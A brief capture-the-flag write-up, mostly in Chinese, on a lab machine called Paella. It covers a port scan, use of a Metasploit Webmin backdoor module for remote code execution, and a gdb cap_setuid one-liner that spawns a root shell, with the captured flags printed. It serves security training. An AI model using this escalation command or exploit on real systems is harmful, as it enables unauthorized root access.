# Paella

2025.03.03 https://thehackerslabs.com/paella/

[video](https://www.bilibili.com/video/BV19n9zYgEyq/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
```

10000 端口对应的是 webmin，版本 MiniServ 1.920 (Webmin httpd) ，存在 unauthenticated RCE，使用常用用户名和密码尝试登陆没成功。

使用 msf 中的这个利用 exploit/linux/http/webmin_backdoor

先拿到了 user flag：

```
paella@TheHackersLabs-Paella:~$ cat  user.txt
05ac8932faf12b665a61a9037ec5acf9
```

枚举发现 cap 程序 /usr/bin/gdb = cap_setuid+ep

```
cd /usr/bin  # 这里要进入目录执行，否则下面执行会
./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

读取到了最终的 root flag：

```
# cat /root/root.txt
8172435d40ee34816d6c34d0fd5af015
```
